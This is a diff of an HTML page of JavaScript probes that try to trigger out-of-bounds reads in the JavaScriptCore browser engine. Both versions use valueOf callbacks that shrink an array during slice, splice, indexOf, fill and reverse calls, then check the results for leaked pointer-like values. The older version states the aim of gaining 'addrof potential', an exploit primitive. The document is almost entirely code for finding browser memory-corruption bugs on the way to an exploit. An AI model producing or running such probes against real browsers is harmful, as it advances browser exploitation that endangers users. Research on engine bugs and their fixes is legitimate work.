@@ -1,112 +1,109 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>JSC OOB Diagnostic</title>
+<meta charset="utf-8">
+<title>JSC OOB Test v2</title>
 </head>
 <body>
-<pre id="output">Running...</pre>
+<pre id="o"></pre>
 <script>
-function log(msg) {
-    document.getElementById('output').textContent += msg + "\n";
-    console.log(msg);
+var o=document.getElementById("o");
+function p(m){o.textContent+=m+"\n"}
+function isLeak(arr) {
+  for(var i=0; i<arr.length; i++) {
+    var v = arr[i];
+    if (typeof v === 'number' && isNaN(v)) return true;
+    // Check for unboxed doubles that look like pointers (large exponents)
+    if (typeof v === 'number' && Math.abs(v) > 1e10) return true;
+  }
+  return false;
 }
 
-function testSlice() {
-    log("[*] Test 1: Array.prototype.slice OOB...");
-    try {
-        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-        var oob = arr.slice(0, {
-            valueOf: function() {
-                arr.length = 0;
-                return 100;
-            }
-        });
-        if (oob.length > 8) {
-            log("[+] LEAK DETECTED! Length: " + oob.length);
-            for (var i = 8; i < Math.min(oob.length, 20); i++) {
-                log("    oob[" + i + "] = " + oob[i]);
-            }
-            return true;
-        }
-        log("[-] Failed. Length: " + oob.length);
-    } catch(e) { log("[-] Crash: " + e.message); }
-    return false;
-}
+p("=== JSC OOB Test v2 ===\n");
 
-function testSplice() {
-    log("[*] Test 2: Array.prototype.splice OOB...");
-    try {
-        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-        var oob = arr.splice(0, {
-            valueOf: function() {
-                arr.length = 0;
-                return 100;
-            }
-        });
-        if (oob.length > 8) {
-            log("[+] LEAK DETECTED! Length: " + oob.length);
-            return true;
-        }
-        log("[-] Failed. Length: " + oob.length);
-    } catch(e) { log("[-] Crash: " + e.message); }
-    return false;
-}
+// Test 1: slice with element valueOf
+p("Test 1: slice + element valueOf");
+try {
+  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var t = false;
+  // Define an object with valueOf that shrinks the array
+  var evil = { valueOf: function() { 
+    if(!t) { t=true; a.length=3; } 
+    return 9.9; 
+  }};
+  a[3] = evil; // Put it in the middle
+  
+  var r = a.slice(0, 8);
+  p("  len="+r.length+" val="+JSON.stringify(r));
+  if(isLeak(r)) p("  [+] LEAK DETECTED!");
+  else p("  [-] No leak");
+} catch(e) { p("  ERR: "+e.message); }
 
-function testIndexOf() {
-    log("[*] Test 3: Array.prototype.indexOf OOB...");
-    try {
-        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-        var idx = arr.indexOf({
-            valueOf: function() {
-                arr.length = 0;
-                return 1.1;
-            }
-        });
-        if (idx > 0) {
-            log("[+] LEAK DETECTED! Found at index: " + idx);
-            return true;
-        }
-        log("[-] Failed. Index: " + idx);
-    } catch(e) { log("[-] Crash: " + e.message); }
-    return false;
-}
+// Test 2: splice with element valueOf
+p("\nTest 2: splice + element valueOf");
+try {
+  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var t = false;
+  var evil = { valueOf: function() { 
+    if(!t) { t=true; a.length=3; } 
+    return 9.9; 
+  }};
+  a[3] = evil;
+  
+  var r = a.splice(0, 8);
+  p("  len="+r.length+" val="+JSON.stringify(r));
+  if(isLeak(r)) p("  [+] LEAK DETECTED!");
+  else p("  [-] No leak");
+} catch(e) { p("  ERR: "+e.message); }
 
-function testFill() {
-    log("[*] Test 4: Array.prototype.fill OOB...");
-    try {
-        var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-        var victim = [9.9, 9.9, 9.9, 9.9, 9.9, 9.9, 9.9, 9.9];
-        arr.fill(0x41414141, 0, {
-            valueOf: function() {
-                arr.length = 0;
-                return 100;
-            }
-        });
-        // Check if victim was corrupted
-        for (var i = 0; i < victim.length; i++) {
-            if (victim[i] !== 9.9) {
-                log("[+] CORRUPTION DETECTED! victim[" + i + "] = " + victim[i]);
-                return true;
-            }
-        }
-        log("[-] Failed. No corruption.");
-    } catch(e) { log("[-] Crash: " + e.message); }
-    return false;
-}
+// Test 3: indexOf with element valueOf
+p("\nTest 3: indexOf + element valueOf");
+try {
+  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var t = false;
+  var evil = { valueOf: function() { 
+    if(!t) { t=true; a.length=3; } 
+    return 9.9; 
+  }};
+  a[3] = evil;
+  
+  var idx = a.indexOf(9.9); // Forces valueOf during search
+  p("  idx="+idx);
+  // If it read OOB, it might crash or return weird index
+} catch(e) { p("  ERR: "+e.message); }
 
-log("=== JSC OOB Diagnostic ===\n");
-var found = false;
-if (testSlice()) found = true;
-if (testSplice()) found = true;
-if (testIndexOf()) found = true;
-if (testFill()) found = true;
+// Test 4: Array.prototype.fill
+p("\nTest 4: fill + element valueOf");
+try {
+  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var t = false;
+  var evil = { valueOf: function() { 
+    if(!t) { t=true; a.length=3; } 
+    return 9.9; 
+  }};
+  
+  a.fill(evil, 0, 8);
+  p("  val="+JSON.stringify(a));
+  if(isLeak(a)) p("  [+] LEAK DETECTED!");
+  else p("  [-] No leak");
+} catch(e) { p("  ERR: "+e.message); }
 
-log("\n=== RESULTS ===");
-if (found) {
-    log("[!!!] JSC VULNERABILITY FOUND! We have addrof potential.");
-} else {
-    log("[*] All JSC OOB variants patched.");
-}
+// Test 5: reverse with element valueOf
+p("\nTest 5: reverse + element valueOf");
+try {
+  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var t = false;
+  var evil = { valueOf: function() { 
+    if(!t) { t=true; a.length=3; } 
+    return 9.9; 
+  }};
+  a[3] = evil;
+  
+  a.reverse();
+  p("  val="+JSON.stringify(a));
+} catch(e) { p("  ERR: "+e.message); }
+
+p("\n=== Done ===");
 </script>
 </body>
 </html>
